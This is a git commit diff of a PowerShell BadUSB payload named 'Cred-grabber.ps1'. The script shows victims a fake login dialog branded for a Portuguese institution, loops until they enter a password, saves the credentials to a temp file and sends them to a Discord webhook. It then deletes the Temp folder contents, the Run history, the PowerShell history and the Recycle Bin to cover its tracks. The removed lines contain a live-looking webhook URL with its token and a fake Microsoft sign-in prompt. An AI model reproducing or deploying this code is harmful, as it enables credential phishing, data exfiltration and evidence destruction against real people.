c83721835134742f079e490703f0e9f35d967c1b
Grindlewalt <110056925+the-shadow-walker@users.noreply.github.com>
2025-06-03 09:50:31 -0700

    Update Cred-grabber.ps1

--- Cred-grabber.ps1
+++ Cred-grabber.ps1
@@ -1,56 +1,37 @@
-#This is not my code. I very slightly modified it from https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/credentials/-RD-Credz-Plz/Credz-Plz.ps1, Made by I AM JACOBY
-
-
-
-<#
-
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
+#code is not mine, i am just uploading for personal use repo: https://github.com/FibraLogica/Flipper_badusb_Phishing/blob/main/Flipper_badusb_Phishing.ps1
+$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
 
 function Get-Creds {
-do{
-$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
-   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
-    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
-    Get-Creds
-}
-$creds = $cred.GetNetworkCredential() | fl
-return $creds
-  # ...
 
-  $done = $true
-} until ($done)
+    $form = $null
 
-}
+    while ($form -eq $null)
+    {
+        $cred = $host.ui.promptforcredential('Autenticação EPFF-INTEP','','',''); 
+        $cred.getnetworkcredential().password
 
-#----------------------------------------------------------------------------------------------------
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+        {
+            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
+            {
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+            }
 
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
-function Pause-Script{
-Add-Type -AssemblyName System.Windows.Forms
-$originalPOS = [System.Windows.Forms.Cursor]::Position.X
-$o=New-Object -ComObject WScript.Shell
-
-    while (1) {
-        $pauseTime = 3
-        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
-            break
+            $msgBody = "As informações não podem estar vazias!"
+            $msgTitle = "Erro de autenticação"
+            $msgButton = 'Ok'
+            $msgImage = 'Stop'
+            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+            Write-Host "The user clicked: $Result"
+            $form = $null
         }
-        else {
-            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        
+        else{
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
         }
     }
 }
-
-#----------------------------------------------------------------------------------------------------
-
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
 
 function Caps-Off {
 Add-Type -AssemblyName System.Windows.Forms
@@ -63,56 +44,53 @@ $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
 }
-#----------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
-#>
 
 Pause-Script
 
 Caps-Off
 
-Add-Type -AssemblyName System.Windows.Forms
-
-[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Autenticar com a sua conta EPFF-INTEP"
+$msgTitle = "Autenticação necessária"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
 
 $creds = Get-Creds
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to save the gathered credentials to a file in the temp directory
-#>
-
 echo $creds >> $env:TMP\$FileName
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-<#
+function Upload-Discord {
 
-.NOTES 
-	This is to upload your files to dropbox
-#>
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
 
-# Send the summary as a Discord message
-$webhookUrl = "https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN"
-$payload = @{
-    username = "$env:USERNAME System Report"
-    content = $creds
+$hookurl = "$dc"
+
+$Body = @{
+  'username' = $env:username
+  'content' = $text
 }
 
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+
 #------------------------------------------------------------------------------------------------------------------------------------
-
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
 
 # Delete contents of Temp folder 
 
@@ -127,3 +105,7 @@ reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
+exit
